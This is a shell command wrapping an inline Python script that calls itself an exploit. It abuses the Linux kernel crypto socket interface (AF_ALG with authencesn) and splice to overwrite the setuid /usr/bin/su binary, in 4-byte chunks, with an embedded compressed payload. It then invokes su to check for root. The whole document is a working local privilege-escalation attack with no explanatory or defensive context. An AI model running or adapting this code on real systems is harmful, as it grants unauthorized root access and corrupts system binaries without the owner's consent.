/tmp/python-standalone/python/bin/python3 -c '
import os, zlib, socket, sys
print("Starting exploit...")

def d(x): return bytes.fromhex(x)
def c(f, t, chunk):
    try:
        a = socket.socket(38, 5, 0)
        a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
        h = 279
        a.setsockopt(h, 1, d("0800010000000010" + "0"*64))
        a.setsockopt(h, 5, None, 4)
        u,_ = a.accept()
        data = b"A"*4 + chunk
        u.sendmsg([data], [(h,3,b"\x00"*4), (h,2,b"\x10"+b"\x00"*19), (h,4,b"\x08"+b"\x00"*3)], 32768)
        r,w = os.pipe()
        o = t + 4
        os.splice(f, w, o, offset_src=0)
        os.splice(r, u.fileno(), o)
        try: u.recv(8+t)
        except: pass
        print(f"  [+] Wrote chunk at offset {t}")
    except Exception as e:
        print(f"  [-] Error at offset {t}: {e}")

f = os.open("/usr/bin/su", 0)
payload = zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
print(f"[+] Loaded payload: {len(payload)} bytes")

for i in range(0, len(payload), 4):
    c(f, i, payload[i:i+4])

print("[+] Exploit finished. Trying su...")
os.system("su -c \"whoami && id\"")
' 2>&1 | tee /tmp/exploit_debug.log
